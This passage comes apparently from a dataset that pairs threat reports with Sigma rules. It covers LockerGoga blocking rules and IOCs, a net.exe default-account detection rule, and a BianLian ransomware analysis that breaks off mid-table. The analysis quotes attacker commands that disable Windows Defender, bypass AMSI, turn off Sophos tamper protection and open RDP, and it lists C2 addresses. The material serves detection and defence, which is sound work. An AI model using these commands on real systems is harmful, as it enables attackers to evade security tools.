assessment to determine if this threat has a high probability of targeting their environments. Whilst the above detailed known samples are incorporated within McAfee technologies, customers can also add the following Access Protection rules to prevent the creation of encrypted files on the victim host:\n\n**Executables:**\n\n- Inclusion Status: Include\n- File Name or Path: *\n\n**SubRule:**\n\n- Type: File\n- Operations: Create\n- Targets:\n  - Target 1:\n    - Include\n    - Files: *.locked\n  - Target 2:\n    - Include\n    - Destination file: *.locked\n\nCustomers can also add the following Access Protection rule to prevent the creation of encrypted files on the victim host:\n\n- File/Folder Access Protection Rule: Processes tInclude: *\n- File or folder name tblock: *.locked\n- File actions tprevent: New files being created\n\n**Access Protection Rules:**\n\nCustomers can also add Access Protection rules matching these characteristics: Prevent Creation\\Execution of:\n\n- `c:\\windows\\temp\\x??.bat`\n- `c:\\windows\\temp\\kill.bat`\n- `c:\\windows\\temp\\taskhost.exe`\n\nPrevent execution of binaries signed with SN:\n\n- C=GB, PostalCode=DT3 4DD, S=WEYMOUTH, L=WEYMOUTH, STREET=16 Australia Road Chickerell,\n- O=MIKL LIMITED, CN=MIKL LIMITED\n- C=GB, PostalCode=WC2H 9JQ, S=LONDON, L=LONDON, STREET=71-75 Shelton Street Covent\n- Garden, O=ALISA LTD, CN=ALISA LTD\n- C=GB, PostalCode=EC1V 2NX, S=LONDON, L=LONDON, STREET=Kemp House 160 City Road,\n- O=KITTY’S LTD, CN=KITTY’S LTD\n\n## YARA RULE\n\nWe have a YARA rule available on our ATR github repository.\n\n## IOCs\n\n- a52f26575556d3c4eccd3b51265cb4e6\n- ba53d8910ec3e46864c3c86ebd628796\n- c2da604a2a469b1075e20c5a52ad3317\n- 7e3f8b6b7ac0565bfcbf0a1e3e6fcfbc\n- 3b200c8173a92c94441cb062d38012f6\n- 438ebec995ad8e05a0cea2e409bfd488\n- 16bcc3b7f32c41e7c7222bf37fe39fe6\n- e11502659f6b5c5bd9f78f534bc38fea\n- 9cad8641ac79688e09c5fa350aef2094\n- 164f72dfb729ca1e15f99d456b7cf811\n- 52340664fe59e030790c48b66924b5bd\n- 174e3d9c7b0380dd7576187c715c4681\n- 3ebca21b1d4e2f482b3eda6634e89211\n- a1d732aa27e1ca2ae45a189451419ed5\n- e8c7c902bcb2191630e10a80ddf9d5de\n- 4da135516f3da1c6ca04d17f83b99e65\n- a5bc1f94e7505a2e73c866551f7996f9\n- b3d3da12ca3b9efd042953caa6c3b8cd\n- faf4de4e1c5d8e4241088c90cfe8eddd\n- dece7ebb578772e466d3ecae5e2917f9\n- MayarChenot@protonmail[.]com\n- DharmaParrack@protonmail[.]com\n- wyattpettigrew8922555@mail[.]com\n- SayanWalsworth96@protonmail[.]com\n- SuzuMcpherson@protonmail[.]com\n- AbbsChevis@protonmail[.]com\n- QicifomuEjijika@o2[.]pl\n- RezawyreEdipi1998@o2[.]pl\n- AsuxidOruraep1999@o2[.]pl\n- IjuqodiSunovib98@o2[.]pl\n- aperywsqaroci@o2[.]pl\n- abbschevis@protonmail[.]com\n- asuxidoruraep1999@o2[.]pl\n- cottleakela@protonmail[.]com\n- couwetizotofo@o2[.]pl\n- dharmaparrack@protonmail[.]com\n- dutyuenugev89@o2[.]pl\n- phanthavongsaneveyah@protonmail[.]com\n- mayarchenot@protonmail[.]com\n- ijuqodisunovib98@o2[.]pl\n- qicifomuejijika@o2[.]pl\n- rezawyreedipi1998@o2[.]pl\n- qyavauzehyco1994@o2[.]pl\n- romanchukeyla@protonmail[.]com\n- sayanwalsworth96@protonmail[.]com\n- schreibereleonora@protonmail[.]com\n- suzumcpherson@protonmail[.]com\n- wyattpettigrew8922555@mail[.]com",
    "sigma_rule": {
      "title": "Suspicious Manipulation Of Default Accounts Via Net.EXE",
      "id": "5b768e71-86f2-4879-b448-81061cbae951",
      "status": "test",
      "description": "Detects suspicious manipulations of default accounts such as 'administrator' and 'guest'. For example 'enable' or 'disable' accounts or change the password...etc",
      "references": [
        "https://www.trellix.com/en-sg/about/newsroom/stories/threat-labs/lockergoga-ransomware-family-used-in-targeted-attacks.html",
        "https://redacted.com/blog/bianlian-ransomware-gang-gives-it-a-go/",
        "https://www.microsoft.com/en-us/security/blog/2022/09/07/profiling-dev-0270-phosphorus-ransomware-operations/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-09-01",
      "modified": "2023-02-21",
      "tags": [
        "attack.collection",
        "attack.t1560.001"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": [
              "\\net.exe",
              "\\net1.exe"
            ]
          },
          {
            "OriginalFileName": [
              "net.exe",
              "net1.exe"
            ]
          }
        ],
        "selection_user_option": {
          "CommandLine|contains": " user "
        },
        "selection_username": {
          "CommandLine|contains": [
            " Järjestelmänvalvoja ",
            " Rendszergazda ",
            " Администратор ",
            " Administrateur ",
            " Administrador ",
            " Administratör ",
            " Administrator ",
            " guest ",
            " DefaultAccount ",
            " \"Järjestelmänvalvoja\" ",
            " \"Rendszergazda\" ",
            " \"Администратор\" ",
            " \"Administrateur\" ",
            " \"Administrador\" ",
            " \"Administratör\" ",
            " \"Administrator\" ",
            " \"guest\" ",
            " \"DefaultAccount\" ",
            " 'Järjestelmänvalvoja' ",
            " 'Rendszergazda' ",
            " 'Администратор' ",
            " 'Administrateur' ",
            " 'Administrador' ",
            " 'Administratör' ",
            " 'Administrator' ",
            " 'guest' ",
            " 'DefaultAccount' "
          ]
        },
        "filter": {
          "CommandLine|contains|all": [
            "guest",
            "/active no"
          ]
        },
        "condition": "all of selection_* and not filter"
      },
      "falsepositives": [
        "Some false positives could occur with the admin or guest account. It depends on the scripts being used by the admins in your env. If you experience a lot of FP you could reduce the level to medium"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_net_user_default_accounts_manipulation.yml",
    "id": "287"
  },
  {
    "url": "https://redacted.com/blog/bianlian-ransomware-gang-gives-it-a-go/",
    "markdown": "# BianLian Ransomware Gang **Gives It a Go!**\n\n**Date:** September 1, 2022\n\nEarlier this year, [redacted] encountered a relatively new ransomware threat actor that called themselves BianLian. We observed the actor deploying custom malware that was written in the Go programming language, which posed some initial, but not insurmountable, reverse-engineering challenges.\n\nBianLian used subtle techniques to exploit, enumerate, and move laterally in victim networks to remain undetected and aggressively worked to counter Endpoint Detection & Response (EDR) protections during the encryption phase of their operations. The group has displayed signs of being new to the practical business aspects of ransomware and associated logistics. Generally, they seemed to be experiencing the growing pains of a group of talented hackers new to this aspect of criminal extortion.\n\nInfrastructure associated with the BianLian group first appeared online in December 2021 and their toolset appears to have been under active development since then. Finally, we have observed the BianLian threat actor tripling their known command and control (C2) infrastructure in the month of August, suggesting a possible increase in the actor’s operational tempo.\n\n## Initial Access\n\nThe BianLian group has successfully targeted the ProxyShell vulnerability chain (CVE-2021-34473, CVE-2021-34523, CVE-2021-31207) to gain initial access into victim networks. After exploitation, they deployed either a webshell or a lightweight remote access solution such as ngrok as the follow-on payload. BianLian has also targeted SonicWall VPN devices for exploitation, another common target for ransomware groups. Finally, while we do not have direct evidence of a successful attack, we have indications that the actor targets servers that provide remote network access via solutions such as Remote Desktop, attempting to exploit weak or exposed credentials. We have also observed dwell times of up to six weeks from the actor gaining initial access and the actual encryption event.\n\n## Tactics On Target\n\nWith a beachhead established within a network, BianLian have shown themselves to be adept with the Living off the Land (LOL) methodology to move laterally, adjusting their operations based on the capabilities and defenses they encountered in the network. For example, they leveraged a combination of the Non-Sucking Service Manager nssm.exe and the reverse proxy ngrok.exe to create backdoors on the servers. Next, they leveraged RDP, WinRM, WMI, and PowerShell to achieve network profiling and lateral movement. Finally, they deployed their custom backdoor to a subset of compromised hosts to provide additional network access should their primary means be disrupted.\n\nAs BianLian would initially spread throughout a network, hunting for the most valuable data to steal and identify the most critical machines to encrypt, they appeared to take steps to minimize observable events. As an example, we have observed the threat actor choosing to avoid pinging a target and instead utilizing the arp command in network segments where the targeted host would be reachable. In instances where ping was necessary, the actor was judicious in the use, often sending just a single ping. While it is possible that a network defense solution could be configured in such a way to identify an abnormal ping, it is unlikely most common EDR and network security solutions would identify an actor performing targeted network reconnaissance via arp.\n\nOnce the BianLian actor identified a host they wished to access, they most often utilized standard LOL techniques such as net.exe to add and/or modify user permissions, netsh.exe to configure host firewall policies, and reg.exe to adjust various registry settings related to remote desktop and security policy enforcement.\n\n### Sample LOL commands observed:\n\n- `\"C:\\Windows\\system32\\net.exe\" localgroup \"Remote Desktop Users\" <similar name to existing admin> /add`\n- `\"C:\\Windows\\system32\\netsh.exe\" advfirewall firewall add rule \"name=allow RemoteDesktop\" dir=in protocol=TCP localport=3389 action=allow`\n- `\"C:\\Windows\\system32\\reg.exe\" add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fAllowToGetHelp /t REG_DWORD /d 1 /f`\n\nEven in the final hours prior to encryption, we observed the actor taking care to avoid detection. In one instance, the actor accessed the victim network to seemingly perform last minute network reconnaissance and/or target verification, again sending single pings and arp requests to hosts. The actor then disconnected from the network for approximately an hour before returning to begin their ransom attack in earnest.\n\nOnce BianLian made the decision that it was time to encrypt a victims network, they set aside their desire to remain undetected and took a much more aggressive approach, attacking any network and/or host based defense that impeded their custom encryptor tool.\n\n### Sample commands observed targeting defenses:\n\n#### Targeting Windows Defender\n\n- `\"C:\\Windows\\system32\\Dism.exe\" /online /Disable-Feature /FeatureName:Windows-Defender /Remove /NoRestart`\n\n#### Targeting Windows Antimalware Scan Interface (AMSI)\n\n- `[Ref].Assembly.GetType(‘System.Management.Automation.AmsiUtils’).GetField(‘amsiInitFailed’,’NonPublic,Static’).SetValue($null,$true)`\n\n#### Targeting Sophos\n\n- `\"C:\\Windows\\system32\\reg.exe\" ADD \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Sophos Endpoint Defense\\TamperProtection\\Config\" /t REG_DWORD /v SAVEnabled /d 0 /f`\n- `\"C:\\Windows\\system32\\reg.exe\" ADD HKEY_LOCAL_MACHINE\\SOFTWARE\\WOW6432Node\\Sophos\\SAVService\\TamperProtection /t REG_DWORD /v Enabled /d 0 /f`\n\nIn one instance, BianLian encountered a server that was configured and defended in such a manner the actor was unable to successfully execute their encryptor. To overcome this, the actor installed TightVNC, modified a registry key to enable network access for TightVNC while in safe mode, then booted the server into safe mode. Since most security applications do not execute in safe mode, this enabled partial encryption of the server.\n\n- `\"C:\\Windows\\system32\\reg.exe\" copy hklm\\system\\CurrentControlSet\\services\\tvnserver hklm\\system\\CurrentControlSet\\control\\safeboot\\network\\tvnserver /s /f`\n\nIn situations where the actor was able to overcome a victim’s defenses, BianLian utilized many of the common techniques observed in a modern ransomware attack such as deleting shadow copy files, deleting backups, as well as distributing and executing their custom encryptor via methods such as RDP, WMI, WinRM, and PowerShell scripts.\n\n### Example Encryption Timeline\n\nIn the hour before attempting the encryption phase of an attack, BianLian leveraged LOL tools to prime the network and targeted machines for attack in a less-alerting manner. They created administrator accounts on multiple servers using net.exe and dropped known-good binaries such as 7zip and winscp to enable last-minute data file exfiltration. When the actor started encryption operations, they moved aggressively and with speed. In 30 minutes, [redacted] witnessed dozens of attempts to encrypt a handful of servers, with each attempt blocked by EDR/AV. The actor then spent the next few hours both trying to circumvent security controls and gain access to additional servers that were not initially targeted in an attempt to successfully encrypt the victims files.\n\n| Time (Duration)               | Event                                                                                                                                                                                                                                                           |\n| ----------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |\n| Start to End (4.5 Hours)      | Traffic flowed externally to several different internal user endpoints throughout the entire encryption phase. The majority of malicious traffic to victim servers for the duration of the incident flowed through these same endpoints.                        |\n| Start+1 Hour (15 Minutes)     | Account manipulation via net.exe on multiple servers. Admin accounts enabled and existing admin account passwords changed to hinder any defensive response. Significant account manipulation continued through the event, but was heaviest in these 15 minutes. |\n| Start+1.25 Hours (45 Minutes) | LOL tools for file exfiltration and remote access dropped to multiple servers and executed.                                                                                                                                                                     |\n| Start+2 Hours (30 Minutes)    | Dozens of attempts to encrypt a handful of different servers.                                                                                                                                                                                                   |\n| Start+2.5 Hours (2 Hours)     | Attempts to circumvent security controls including EDR.                                                                                                                                                                                                         |\n| Start+2.5 Hours (2 Hours)     | Over a dozen attempts to encrypt several additional servers that were not included in the initial targeting.                                                                                                                                                    |\n\n### Tools Used and Their Evolution\n\nThe BianLian group has developed a custom tool set consisting of a backdoor and an encryptor, developing both using the Go programming language.\n\n#### Encryptor\n\nAs first highlighted by MalwareHunterTeam, BianLian’s custom encryptor was developed in Go. This encryptor also appears to have been under active development since the BianLian group first came online earlier this year. As the MalwareHunterTeam noted, the samples highlighted in VirusTotal contain apparent versioning information:\n\n- `jack/Projects/project1/crypt27`\n- `jack/Projects/project1/crypt28`\n\nThe earliest version of the encryption binary we have been able to recover appears to be version 8 and was compiled using Go version 1.18.2:\n\n```\nSHA256: b60be0b5c6e553e483a9ef9040a9314dd54335de7050fed691a07f299ccb8bc6\n```\n\n```image\nAlt: bian lian ransomware group\nDescription: The image is a screenshot of terminal output showing the build information for a Go program. It includes details such as the Go version (1.18.2), project paths, module names, and compiler settings. The output indicates the build configuration for a project related to the BianLian ransomware group's encryptor, specifically the 'crypt8' version.\nTranscription: |\n  Go buildinf:\n  \tgo:1.18.2\n  path:\n  \tproject1/crypt8\n  \tproject1/crypt8\n  \t(devel)\n  \tproject1/common\n  \tv0.0.0\n  \t./common\n  \t(devel)\n  build:\n  \t-compiler=gc\n  build:\n  \t-gcflags=all=-trimpath=/home/jack/Projects/project1/crypt8\n  build:\n  \t-ldflags=\"-H windowsgui -s -w -extldflags \\\"-static\\\"\"\n  build:\n  \tCGO_ENABLED=0\n  build:\n  \tGOARCH=amd64\n```\n\nAs the actor has evolved this encryptor, so has the text used in the ransom note left behind on a victim’s computers. While the file name has remained constant, the level of detail and professionalism of the text has improved over time.\n\n#### Version 8 ransom note:\n\n```image\nAlt: bian lian ransomware group\nDescription: The image is a screenshot of a ransom note associated with the BianLian ransomware gang. It contains a message instructing the victim on how to contact the attackers to unblock their data. Key elements include a command to write to a Tox link and an email address, warnings against self-recovery attempts, and a threat regarding the victim's data appearing on the dark web if no contact is made. The text is presented in a dark-themed layout typical of command line interfaces.\nTranscription: |\n  To unblock your data write us to Tox (https://qtox.github.io/) or @mail2tor.com  \n  Don't try to recover yourself otherwise you may lose your data.  \n  Your ID:  \n  On the ______ your data will appear on big darknet market if you won't connect us.\n```\n\n#### Version 27/28 ransom note:\n\n```image\nAlt: bian lian ransomware group\nDescription: The image displays a ransom note from the BianLian ransomware gang, formatted in a dark theme typical of terminal interfaces. The message informs the victim about the attack, instructing them not to attempt self-recovery of their files. It includes a contact method via the 'tox' messenger and provides a user ID for further instructions. The note also threatens to publish stolen data on a specified site, emphasizing the potential financial and reputational damage to the victim's organization.\nTranscription: |\n  Your network systems were attacked and encrypted. Contact us in order to restore your data. Don't make any changes in your file structure: touch no files, don't try to recover by yourself, that may lead to it's complete loss.\n  \n  To contact us you have to download \"tox\" messenger: https://qtox.github.io/\n  \n  Add user with the following ID to get your instructions: [REDACTED]\n  \n  Alternative way: [REDACTED]@onionmail.org\n  \n  Your ID: [REDACTED]\n  \n  You should know that we have been downloading data from your network for a significant time before the attack: financial, client, business, post, technical and personal files. In 10 days – it will be posted at our site http://bianlian[REDACTED].onion with links send to your clients, partners, competitors and news agencies, that will lead to a negative impact on your company: potential financial, business and reputational loses.\n```\n\nAs was reported by Cyble, BianLian’s custom encryptor operates on a file extension exclusion model. Once again, we can see that the actor has made adjustments to their binary in that the file types they target as they attempt to ransom victim networks has changed over time.\n\nCompared to Version 27/28, Version 8 of the encryptor would not exclude .lnk files, but would additionally exclude files with the following extensions:\n\n- `.drv`\n- `.bianlian`\n- `.mui`\n\n```image\nAlt: bian lian ransomware group\nDescription: The image displays a snippet of code, likely from the source of the BianLian ransomware encryptor. It appears to show a list of file extensions that the encryptor either targets or excludes, including extensions such as `.exe`, `.sys`, `.drv`, and `.bianlian`. The code structure suggests it is part of a larger function that manages file handling within the ransomware's operation.\nTranscription: |\n  c\n  if ( (unsigned __int64)&retaddr <= *(_QWORD *)(v0 + 16) )\n      runtime_morestack_noctxt();\n  runtime_newobject(v6);\n  *v1 = \".exe\";\n  v1[1] = 4LL;\n  v1[2] = 4LL;\n  v1[3] = \".sys\";\n  v1[4] = 4LL;\n  v1[5] = \".drv\";\n  v1[6] = 4LL;\n  v1[7] = \".dll\";\n  v1[8] = 5LL;\n  v1[9] = \".html\";\n  v1[10] = 4LL;\n  v1[11] = \".txt\";\n  v1[12] = 9LL;\n  v1[13] = \".bianlian\";\n  v1[14] = 4LL;\n  qword_61C268 = 8LL;\n  qword_61C270 = 8LL;\n  if (dword_67100)\n      runtime_gcWriteBarrier();\n```\n\n#### Custom Backdoor\n\nIn addition to the encryptor, BianLian has developed a simple yet effective backdoor that they have deployed on machines within victim networks, enabling additional means of access. While some actors choose to deploy a full feature remote access tool with a multitude of built-in commands, BianLian’s backdoor is, at the core of it, an efficient mechanism for them to retrieve an arbitrary payload from their C2 servers, load it into memory and then execute it.\n\nEach backdoor binary would be configured with a hardcoded IP and Port combination that it will attempt to communicate with. As an example, the binary below will attempt to establish a secure connection to 209.141.54[.]205 on port 5307.\n\n```\nSHA256: da7a959ae7ea237bb6cd913119a35baa43a68e375f892857f6d77eaa62aabbaf\n```\n\n```image\nAlt: bian lian ransomware group\nDescription: The image displays a file path related to the BianLian ransomware group's backdoor binary. It shows a directory structure leading to a Go programming language file named 'main.go' located at '209.141.54.205' on port '5307'. The context implies that this file is part of the backdoor mechanism used by the ransomware gang to establish communication with their command and control (C2) server.\nTranscription: / home/admin/prjct/golang/socks/out/209.141.54.205/5307-39718/client/main.go\n```\n\nWe have observed BianLian deploy multiple backdoors into a victim network with each backdoor configured to either talk to a unique IP or a common IP but on different ports. Not only did this IP and port diversity provide the actor with multiple network paths into the victims network, but every binary would have a unique hash, defeating attempts to detect the backdoors via a simple checksum-based rule.\n\n### Infrastructure\n\nIn investigating BianLian’s infrastructure, it appeared the group prefers Linux-based hosts for their C2 servers, but we have also found evidence of Windows servers being utilized in their operations. While we do not have enough evidence to confidently identify the C2 software the group is using, we have seen indications that the C2 component is also written in the actors preferred language, Go, which would presumably allow them to easily deploy their C2 solution on either OS.\n\nThe number of active C2 nodes has also increased in relative relation to the development of the actor’s toolkit. Based on our research, the earliest known C2 server we have identified, 23.94.56[.]154, first appeared online at the end of December 2021 and remained active until early August of this year. From that initial IP, BianLian appeared to have gradually acquired new C2 servers, occasionally removing an IP, before reaching approximately ten active servers by the end of July.\n\nStarting in August, we observed what appeared to be a somewhat troubling explosion in the rate by which BianLian was bringing new C2 servers online. Throughout the month, BianLian continued to add new C2 nodes to their operational infrastructure, ending the month with approximately 30 active IPs, a three-fold increase in just a matter of weeks. While we lack the insight to know the exact cause for this sudden explosion in growth, this may signal that they are ready to increase their operational tempo, though whatever the reason, there is little good that comes from a ransomware operator having more resources available to them.\n\n```image\nAlt: bian lian ransomware group\nDescription: The image is a bar graph titled \"Average Active C2's per Month.\" It displays the number of active Command and Control (C2) servers for the BianLian ransomware gang from January to August. The graph shows a significant increase in the number of active C2 servers, with the count rising dramatically in August, reaching around 30, compared to much lower numbers in the preceding months. The x-axis represents the months from January to August, while the y-axis indicates the number of active C2 servers.\nTranscription: |\n  Average Active C2's per Month\n  \n  - January: 0\n  - February: 0\n  - March: 0\n  - April: 5\n  - May: 10\n  - June: 15\n  - July: 25\n  - August: 30\n```\n\n### Victimology\n\nAs is the norm for a group conducting double extortion style ransomware attacks, the BianLian group maintained a leak site where they post the data they have exfiltrated from victim networks. While an unfortunate truth in the ransomware space is that the true number of organizations and victims of ransomware attacks will never be known, as of September 1, 2022, the BianLian site has posted details on twenty victim organizations. The threat actor also took the time to categorize the industry vertical of the victims and tagged the corresponding data.\n\n```image\nAlt: bian lian ransomware group\nDescription: The image displays a list of tags related to the BianLian ransomware group, categorizing various victim organizations by industry. The tags include sectors such as healthcare, education, engineering, insurance, and law, among others. Each tag is highlighted in red, indicating that these are the areas in which the BianLian group has targeted victims. The image suggests a focus on diverse industries and regions, including the USA, UK, and Australia, providing insight into the group's victimology.\nTranscription: |\n  BianLian\n  \n  # All tags\n  - usa\n  - healthcare\n  - education\n  - engineering\n  - insurance\n  - australia\n  - construction\n  - law\n  - lawyers\n  - marketing\n  - media\n  - medicine\n  - pharmaceuticals\n  - resort\n  - uk\n  - united-kingdom\n  \n  2022 © BianLian\n```\n\nThe victim organizations range from small/medium size businesses to a large multinational company, with the majority of the companies based in North America, the UK and Australia.\n\nIn the past, BianLian has occasionally posted teaser information on victim organizations, leaving the victims identities masked, which may have served as an additional pressure mechanism on the victims in an attempt to have them pay the actors ransom demand.\n\nWe also note that this is a small sample size and continued observation will be required before drawing significant conclusions on victimology or any possible preference in targeting by BianLian.\n\n### Attribution\n\nWhile there is a long history of seemingly new ransomware groups rising from the ashes of defunct and/or rebranded groups, we do not have any indications at this time to suggest that is the case with BianLian. For all intents and purposes, the BianLian group appears to represent a new entity in the ransomware ecosystem. Furthermore, we assess that the BianLian actors represent a group of individuals who are very skilled in network penetration but are relatively new to the extortion/ransomware business. This hypothesis is based in part on our observations of how the BianLian group has managed the business side of a ransomware operation compared to their relative skill level in compromising and navigating victim networks.\n\nWhile the actor has proven themselves proficient at compromising a victim network, we have seen the actor:\n\n- Mistakenly sending data from one victim to another.\n- Possessing a relatively stable backdoor toolkit, but have an actively developing encryption tool with an evolving ransom note.\n- Long delays in communications with victims.\n- Through the groups own admission on their onion site, the business side of their infrastructure is unreliable.\n\n```image\nAlt: bian lian ransomware group\nDescription: The image displays a webpage belonging to the BianLian ransomware group, indicating that they are currently updating their infrastructure. It features a message stating, 'Currently we're updating our infrastructure. So you may have temporary issues to download huge files.' The top of the page includes navigation links labeled 'Home,' 'Companies,' 'Tags,' and 'Contacts,' with some text highlighted in red. This screenshot provides insight into the operational status of the ransomware group's website.\nTranscription: |\n  BianLian\n  \n  Currently we're updating our infrastructure. So you may have temporary issues to download huge files.\n  \n  Home Companies Tags Contacts\n```\n\nNote: There is an Android banking trojan that has been referred to by some researchers as BianLian (a.k.a. Hydra.) To date, we have seen no indications that this is related to the BianLian ransomware group. 1 2\n\n### Recommendations\n\nWhen mitigating the threat posed by ransomware actors, it is essential to use a layered approach. Focus needs to be placed on reducing your attack surface to avoid the most common types of exploitation techniques, but also preparing to act quickly and effectively when a compromise inevitably happens.\n\n**This includes ensuring you have:**\n- An aggressive, prioritized patching regime;\n- Employ multi-factor authentication on every system that allows that as an option;\n- Visibility into your network and endpoint devices to quickly identify breaches;\n- Secure backups to allow return to business operations as soon as possible;\n- A well practiced incident response plan so everyone involved knows their role; and\n- An assessment of your ‘Crown Jewels’ that can be used to both inform your security posture and decide ahead of an incident what data you could afford to have leaked so you can avoid paying the ransom.\n\nIn addition to these strategic recommendations, there are multiple opportunities for behavioral detections in the attack chain leveraged by BianLian:\n1. **Defense Evasion:** Svchost not a child of services.exe\n   - BianLian called one of their LOL tools svchost, then launched it via a process other than services.exe.\n2. **Defense Evasion:** Svchost executing from an unusual path\n   - BianLian called one of their LOL tools svchost.exe, then executed it from a non-standard path.\n3. **Defense Evasion:** Netsh to modify firewall rules\n   - BianLian leveraged netsh to add a firewall rule to open 3389 to Remote Desktop.\n4. **Reconnaissance:** Ping -4 -n 1\n   - BianLian used single pings to perform network reconnaissance. This is a false-positive prone alert.\n5. **Lateral Movement:** Winrm dropping a file via PowerShell\n   - The binary wsmprovhost.exe is used to mediate the relationship between WinRM and PowerShell. Alerting on file modification by wsmprovhost.exe proved a reliable method to detect BianLian dropping malicious files.\n6. **Lateral Movement:** Unknown Binary Established Connection on 3389\n   - If leveraging an EDR that classifies binaries as known and unknown and ties network connections to binaries, looking for 3389 in use by unknown binaries can be extremely fruitful. This rule detects BianLian’s custom Go backdoor.\n7. **Credential Access:** Account manipulation via net.exe\n   - “Net user” is too loud to alert on in most environments, but we recommend alerting on a threshold of “net user” executions. Even a threshold as high as 10 events in 15 minutes would have detected BianLian in the attacks witnessed.\n8. **Execution:** Unknown binary launching PowerShell\n   - If leveraging an EDR that classifies binaries as known and unknown, searching for unknown binaries launching PowerShell will frequently detect use of the BianLian backdoor.\n9. **Defense Evasion:** Reg.exe modifying safeboot keys\n   - BianLian added a remote access tool to safeboot keys in order to enable network access for their remote access tool in safeboot.\n\n### Indicators of Compromise\n\n#### Backdoors\n\n- 001f33dd5ec923afa836bb9e8049958decc152eeb6f6012b1cb635cff03be2a2\n- 1a1177363be7319e7fb50ac84f69acb633fd51c58f7d2d73a1d5efb5c376f256\n- 20bab94e6d9c8ed4832ce3b58f9150b16f9e5f40ffdcb747e10366cab5a30352\n- 36281d02e28dd26a1db37ebe36941fc9eb1748868e96b544f227b3b59de51fea\n- 3bdcc81931687abac9e6ba4c80d4d596cebb470c80f56213aa29d3da43925537\n- 50c86fb27bed1962903a5f9d155544e3fdb859ae19e967a10f0bf3a60bb8954f\n- 5d429e05cede806ecea2e99116cac09558fcc0011095201e66c2e65c42f80fcf\n- 64065c29b369881ee36314c0d15e442510027186fd9087aec0f63e22a5c6f24c\n- 6d7009df2fa033f7adc30793ebd5254ef47a803950e31f5c52fa3ead1197599f\n- 8084eddfdb157edf8b1c0cdf8bf4d4e4aaa332fc871c2892aa4113b5148ac63e\n- 8592862cd28bcc23cfbcf57c82569c0b74a70cd7ea70dbdee7421f3fafc7ecaf\n- 86a9b84c6258c99b3c3c5b94a2087bc76a533f6043829ded5d8559e88b97fb2f\n- 9b7a0117a27dc418fbf851afcd96c25c7ad995d7be7f3d8d888fa26a6e530221\n- bb2e9fd9d60f49f0fc2c46f8254e5617d4ec856f40256554087cda727a5f6019\n- c0fe7bfb0d1ffeb61fb9cafeeab79ffd1660ff3637798e315ff15d802a3c974e\n- c7fe3fc6ffdfc31bc360afe7d5d6887c622e75cc91bc97523c8115b0e0158ad6\n- cd17afd9115b2d83e948a1bcabf508f42d0fe7edb56cc62f5cc467c938e45033\n- d602562ba7273695df9248a8590b510ccd49fefb97f5c75d485895abba13418d\n- da7a959ae7ea237bb6cd913119a35baa43a68e375f892857f6d77eaa62aabbaf\n- dda89e9e6c70ff814c65e1748a27b42517690acb12c65c3bbd60ae3ab41e7aca\n- de31a4125eb74d0b7cbf2451b40fdb2d66d279a8b8fd42191660b196a9ac468f\n- f7a3a8734c004682201b8873691d684985329be3fcdba965f268103a086ebaad\n\n#### Encryptors\n\n- 1fd07b8d1728e416f897bef4f1471126f9b18ef108eb952f4b75050da22e8e43\n- b60be0b5c6e553e483a9ef9040a9314dd54335de7050fed691a07f299ccb8bc6\n- cbab4614a2cdd65eb619a4dd0b5e726f0a94483212945f110694098194f77095\n- eaf5e26c5e73f3db82cd07ea45e4d244ccb3ec3397ab5263a1a74add7bbcb6e2\n\n#### Active IPs\n\n- 104.225.129[.]86\n- 104.238.223[.]10\n- 104.238.223[.]3\n- 109.248.6[.]207\n- 13.49.57[.]110\n- 144.208.127[.]119\n- 146.0.79[.]9\n- 157.245.80[.]66\n- 16.162.137[.]220\n- 165.22.87[.]199\n- 172.93.96[.]61\n- 172.93.96[.]62\n- 18.130.242[.]71\n- 185.108.129[.]242\n- 185.225.69[.]173\n- 185.56.80[.]28\n- 185.62.58[.]151\n- 185.69.53[.]38\n- 192.145.38[.]242\n- 192.161.48[.]43\n- 192.169.6[.]232\n- 37.235.54[.]81\n- 45.9.150[.]132\n- 5.2.79[.]138\n- 51.68.190[.]20\n- 54.173.59[.]51\n- 62.84.112[.]68\n- 64.52.80[.]120\n- 66.135.0[.]42\n- 83.136.180[.]12\n- 85.13.117[.]213\n- 85.13.117[.]218\n- 91.199.209[.]20\n- 95.179.137[.]20\n\n#### Historical IPs\n\n- 104.207.155[.]133\n- 104.238.61[.]153\n- 146.70.44[.]248\n- 155.94.160[.]241\n- 167.88.15[.]98\n- 172.96.137[.]107\n- 188.166.81[.]141\n- 194.26.29[.]131\n- 194.5.212[.]205\n- 194.58.119.159\n- 198.252.108[.]34\n- 202.66.72[.]7\n- 208.123.119[.]145\n- 209.141.54[.]205\n- 23.227.198[.]243\n- 23.94.56[.]154\n- 43.155.116[.]250\n- 45.144.30[.]139\n- 45.92.156[.]105\n- 5.188.6[.]118\n- 5.230.67[.]2\n- 85.13.116[.]194\n- 85.13.117[.]219\n- 89.22.224[.]3\n\n### IP Context\n\n#### Active C2s\n\n| IP Address        | First Seen     |\n| ----------------- | -------------- |\n| 104.225.129[.]86  | Late July      |\n| 104.238.223[.]10  | Late July      |\n| 104.238.223[.]3   | Late August    |\n| 109.248.6[.]207   | Late August    |\n| 13.49.57[.]110    | Mid May        |\n| 144.208.127[.]119 | Mid August     |\n| 146.0.79[.]9      | Early February |\n| 157.245.80[.]66   | Early June     |\n| 16.162.137[.]220  | Mid July       |\n| 165.22.87[.]199   | Late August    |\n| 172.93.96[.]61    | Mid August     |\n| 172.93.96[.]62    | Late August    |\n| 18.130.242[.]71   | Mid July       |\n| 185.108.129[.]242 | Early August   |\n| 185.225.69[.]173  | Mid August     |\n| 185.56.80[.]28    | Early August   |\n| 185.62.58[.]151   | Mid August     |\n| 185.69.53[.]38    | Late May       |\n| 192.145.38[.]242  | Late August    |\n| 192.161.48[.]43   | Mid August     |\n| 192.169.6[.]232   | Mid August     |\n| 37.235.54[.]81    | Late August    |\n| 45.9.150[.]132    | Early August   |\n| 5.2.79[.]138      | Late August    |\n| 51.68.190[.]20    | Late August    |\n| 54.173.59[.]51    | Mid August     |\n| 62.84.112[.]68    | Mid August     |\n| 64.52.80[.]120    | Early August   